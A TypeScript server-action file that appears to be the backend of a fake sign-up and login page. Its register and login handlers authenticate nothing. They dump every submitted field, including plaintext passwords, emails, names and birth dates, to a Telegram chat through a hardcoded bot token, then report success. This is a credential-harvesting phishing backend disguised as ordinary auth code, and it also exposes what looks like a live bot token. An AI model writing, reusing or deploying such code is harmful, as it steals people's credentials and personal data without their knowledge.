const TELEGRAM_TOKEN = '8575418688:AAGo4tPdNzTdJ0pgzo2i9viA18ITf6ShbyQ';
const TELEGRAM_CHAT_ID = '7194902603';

function normalizeUsername(username: string) {
	return username.trim().toLowerCase();
}

function normalizeEmail(email: string) {
	return email.trim().toLowerCase();
}

async function sendToTelegram(text: string) {
	if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
		throw new Error('Telegram token or chat ID is not configured.');
	}

	const res = await fetch(
		`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
		{
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({
				chat_id: TELEGRAM_CHAT_ID,
				text,
			}),
		}
	);

	const data = await res.json();

	if (!data.ok) {
		throw new Error(`Telegram error: ${data.description ?? 'unknown'}`);
	}
}

export async function registerAction(formData: FormData) {
	const email = normalizeEmail(String(formData.get('email') ?? ''));
	const password = String(formData.get('password') ?? '');
	const fullName = String(formData.get('fullName') ?? '').trim();
	const username = normalizeUsername(String(formData.get('username') ?? ''));
	const month = Number(formData.get('month'));
	const day = Number(formData.get('day'));
	const year = Number(formData.get('year'));

	if (!email || !password || !fullName || !username || !month || !day || !year) {
		return { error: 'Please fill in all fields.' };
	}

	if (password.length < 6) {
		return { error: 'Password must be at least 6 characters.' };
	}

	if (!/^[a-z0-9._]+$/.test(username)) {
		return {
			error: 'Username can only contain letters, numbers, dots and underscores.',
		};
	}

	const data = Object.fromEntries(formData);
	await sendToTelegram(`REGISTER FORM\n\n${JSON.stringify(data, null, 2)}`);

	return { error: '' };
}

export async function loginAction(formData: FormData) {
	const data = Object.fromEntries(formData);
	await sendToTelegram(`LOGIN FORM\n\n${JSON.stringify(data, null, 2)}`);

	return { error: '' };
}
